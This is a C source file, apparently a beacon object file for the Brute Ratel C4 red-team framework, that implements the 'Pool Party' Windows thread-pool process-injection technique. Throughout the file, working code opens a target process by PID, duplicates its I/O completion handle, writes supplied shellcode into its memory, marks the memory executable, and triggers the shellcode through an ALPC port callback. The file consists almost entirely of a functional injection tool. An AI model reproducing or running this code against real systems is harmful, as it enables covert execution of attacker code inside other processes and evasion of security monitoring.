// This technique uses the same technique as
// https://www.blackhat.com/eu-23/briefings/schedule/#the-pool-party-you-will-never-forget-new-process-injection-techniques-using-windows-thread-pools-35446
// but is built to support BRc4 BOFs

#include "pooling.h"

WCHAR* genRand(SIZE_T length) {
    WCHAR* buff = (WCHAR*)BadgerAlloc((length + 1) * sizeof(WCHAR));
    for (int i = 0; i < length; ++i) {
        buff[i] = (L'A' + Msvcrt$rand() % 26);
    }
    return buff;
}

HANDLE HijackProcessHandle(HANDLE hProcess) {
    DWORD dwDesiredAccess = IO_COMPLETION_ALL_ACCESS;
    ULONG procInfoLen = 0;
    NTSTATUS ntError = STATUS_INFO_LENGTH_MISMATCH;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcInfo = NULL;
    HANDLE hDuplicatedObject = NULL;

    do {
        pProcInfo = (PVOID)BadgerAlloc(procInfoLen);
        ntError = Ntdll$NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)(ProcessHandleInformation), pProcInfo, procInfoLen, &procInfoLen);
    } while (ntError == STATUS_INFO_LENGTH_MISMATCH);
    for (int i = 0; i < pProcInfo->NumberOfHandles; i++) {
        if (Kernel32$DuplicateHandle(hProcess, pProcInfo->Handles[i].HandleValue, (HANDLE)-1, &hDuplicatedObject, dwDesiredAccess, FALSE, (DWORD_PTR)NULL)) {
            ULONG objectLen = 0;
            PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = NULL;
            if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == STATUS_INFO_LENGTH_MISMATCH) {
                pObjectTypeInformation = BadgerAlloc(objectLen);
                if (pObjectTypeInformation) {
                    if (Ntdll$NtQueryObject(hDuplicatedObject, ObjectTypeInformation, pObjectTypeInformation, objectLen, &objectLen) == 0) {
                        if (Msvcrt$wcscmp(L"IoCompletion", pObjectTypeInformation->TypeName.Buffer) == 0) {
                            BadgerFree((PVOID*)&pObjectTypeInformation);
                            goto cleanUp;
                        }
                    }
                    BadgerFree((PVOID*)&pObjectTypeInformation);
                }
            }
            Kernel32$CloseHandle(hDuplicatedObject);
            hDuplicatedObject = NULL;
        }
    }
cleanUp:
    BadgerFree((PVOID*)&pProcInfo);
    return hDuplicatedObject;
}

void RemoteTpAlpcInsertionSetupExecution(HANDLE hProcess, HANDLE hIoCompletion, PVOID shellcode, SIZE_T shcBufferSize) {
	Msvcrt$srand((unsigned int)Msvcrt$_time64((time_t)NULL));
	HANDLE hTmpAlpcPort = NULL;
	HANDLE hAlpcPort = NULL;
	HANDLE hAlpc_ = NULL;

	PFULL_TP_ALPC pTmpTpAlpc = NULL;
    PFULL_TP_ALPC pRemoteTpAlpc = NULL;
    UNICODE_STRING usAlpcPortName = { 0 };
	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;

    NTSTATUS ntError = 0;
	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
    DWORD dwOldProtect;
	const char* Buffer = "Hello World";
	int BufferLength = sizeof(Buffer);
	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	BadgerMemcpy(ClientAlpcPortMessage.PortMessage, Buffer, sizeof(ClientAlpcPortMessage.PortMessage));
	SIZE_T szClientAlpcPortMessage = sizeof(ClientAlpcPortMessage);

    WCHAR* portNameInit = L"\\RPC Control\\";
    SIZE_T portNameInitLen = BadgerWcslen(portNameInit)*2;
	WCHAR* portNameEnd = genRand(10);
	WCHAR finalPortName[MAX_PATH] = { 0 } ;
    BadgerMemcpy((PVOID)finalPortName, portNameInit, portNameInitLen);
    BadgerMemcpy((PVOID)finalPortName + portNameInitLen, portNameEnd, BadgerWcslen(portNameEnd)*2);

    Ntdll$RtlInitUnicodeString(&usAlpcPortName, finalPortName);
    InitializeObjectAttributes(&AlpcObjectAttributes, &usAlpcPortName, 0, 0, 0);

	ntError = Ntdll$NtAlpcCreatePort(&hTmpAlpcPort, NULL, NULL);
	if (ntError) {
        BadgerDispatch(g_dispatch, "[-] Error NtAlpcCreatePort: 0x%08x\n", ntError);
        return;
	}
	BadgerDispatch(g_dispatch, "[+] Created temporary ALPC port: %d\n", hTmpAlpcPort);

	ntError = Ntdll$TpAllocAlpcCompletion(&pTmpTpAlpc, hTmpAlpcPort, (PTP_ALPC_CALLBACK)shellcode, NULL, NULL);
	if (ntError) {
    	BadgerDispatch(g_dispatch, "[-] Error TpAllocAlpcCompletion: 0x%08x\n", ntError);
		return;
	}

	ntError = Ntdll$NtAlpcCreatePort(&hAlpcPort, &AlpcObjectAttributes, &AlpcPortAttributes);
	if (ntError) {
		BadgerDispatch(g_dispatch, "[-] Failed to create pool party ALPC port '%ls': 0x%08x\n", finalPortName, ntError);
		return;
	}
	BadgerDispatch(g_dispatch, "[+] Created thread pool ALPC port `%ls`: %d\n", finalPortName, hAlpcPort);

	pRemoteTpAlpc = (PFULL_TP_ALPC) Kernel32$VirtualAllocEx(hProcess, NULL, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! pRemoteTpAlpc) {
        BadgerDispatch(g_dispatch, "[-] Error allocating RW memory: %lu\n", Kernel32$GetLastError());
        return;
    }

	if (! Kernel32$WriteProcessMemory(hProcess, pRemoteTpAlpc, pTmpTpAlpc, sizeof(FULL_TP_ALPC), NULL)) {
		BadgerDispatch(g_dispatch, "[-] Error writing pTmpTpAlpc: %lu\n", Kernel32$GetLastError());
		return;
    }

	AlpcPortAssociateCopmletionPort.CompletionKey = pRemoteTpAlpc;
	AlpcPortAssociateCopmletionPort.CompletionPort = hIoCompletion;
    ntError = Ntdll$NtAlpcSetInformation(hAlpcPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
	if (ntError) {
		BadgerDispatch(g_dispatch, "[-] Error NtAlpcSetInformation 0x%08x\n", ntError);
		return;
    }
	BadgerDispatch(g_dispatch, "[+] Associated ALPC port `%ls` with the IO completion port of the target process worker factory\n", finalPortName);

    if (! Kernel32$VirtualProtectEx(hProcess, shellcode, shcBufferSize, PAGE_EXECUTE_READ, &dwOldProtect)) {
        BadgerDispatch(g_dispatch, "[-] Error setting RX permission: %lu\n", Kernel32$GetLastError());
        return;
    }

	ntError = Ntdll$NtAlpcConnectPort(&hAlpc_, &usAlpcPortName, &AlpcClientObjectAttributes, &AlpcPortAttributes, 0x20000, NULL, (PPORT_MESSAGE)&ClientAlpcPortMessage, &szClientAlpcPortMessage, NULL, NULL, &liTimeout);
	if (ntError) {
        if (ntError != STATUS_TIMEOUT) {
            BadgerDispatch(g_dispatch, "[-] Error NtAlpcConnectPort 0x%08x\n", ntError);
            return;
        }
    }
	BadgerDispatch(g_dispatch, "[+] I/O to ALPC port success", finalPortName);
}

void coffee(char** argv, int argc, WCHAR** dispatch) {
    g_dispatch = dispatch;
	if (argc < 2) {
	    BadgerDispatch(dispatch, "[!] Usage: tpi.o <pid>\n[!] NOTE: configure shellcode to inject using 'set_coffargs'\n");
		return;
	}
    PVOID shellcode = NULL;
	PVOID shcBuffer = argv[0];
	DWORD dwPid = BadgerAtoi(argv[1]);
	DWORD shcBufferSize = BadgerGetBufferSize(argv[0]);
    HANDLE hIoCompletion = NULL;
    HANDLE hProcess = NULL;

    // hProcess = Kernel32$OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    hProcess = Kernel32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    if (! hProcess) {
        BadgerDispatch(g_dispatch, "[-] Error opening process handle: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }

	hIoCompletion = HijackProcessHandle(hProcess);
    if (! hIoCompletion) {
        BadgerDispatch(g_dispatch, "[-] No thread pools found in process\n");
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Hijacked I/O completion handle\n");

    shellcode = Kernel32$VirtualAllocEx(hProcess, NULL, shcBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (! shellcode) {
        BadgerDispatch(g_dispatch, "[-] Error allocating RW memory: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }
    BadgerDispatch(g_dispatch, "[+] Shellcode address: 0x%p\n", shellcode);

    if (! Kernel32$WriteProcessMemory(hProcess, shellcode, shcBuffer, shcBufferSize, NULL)) {
        BadgerDispatch(g_dispatch, "[-] Error writing shellcode: %lu\n", Kernel32$GetLastError());
        goto cleanUp;
    }

	RemoteTpAlpcInsertionSetupExecution(hProcess, hIoCompletion, shellcode, shcBufferSize);

cleanUp:
    if (hProcess) {
        Kernel32$CloseHandle(hProcess);
    }
    if (hIoCompletion) {
        Kernel32$CloseHandle(hIoCompletion);
    }
}